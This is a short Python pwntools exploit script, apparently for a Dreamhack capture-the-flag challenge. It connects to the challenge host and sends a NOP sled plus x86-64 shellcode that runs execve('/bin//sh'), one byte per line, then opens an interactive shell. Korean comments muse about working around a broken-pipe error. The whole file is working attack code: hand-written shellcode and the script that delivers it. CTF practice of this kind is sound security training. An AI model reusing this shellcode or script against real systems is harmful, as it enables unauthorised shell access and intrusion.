from pwn import *

context.arch = "amd64"
context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./prob")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)

elf = ELF("./prob")
libc = ELF("./libc.so.6")
rdi_ret = 0x40129b
# NOP Sled (\x90)
# 너무 많은 input으로 생긴 broken pipe 에러로 인한 이슈는
# 1. decision2solve로 unsafe_func의 esi인 0x10000h를 크기를 줄여버리고
# 2. 줄이는 과정에서 hex 명령어를 nop를 활용해 적절히 조절하고
# 3. read_input를 nop sled로 해결한다면? 되지 않을까?
payload = b"\x90" * 0x100 + \
    b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
#p.sendafter("> ", b"Decision2Solve")
p.sendlineafter("> ", b"A" * 16)
p.sendlineafter("> ", b"2")
arr = [bytes([b]) for b in payload]
for n, i in enumerate(arr):
    print("Trial: " + str(n))
    p.sendline(i)

p.interactive()
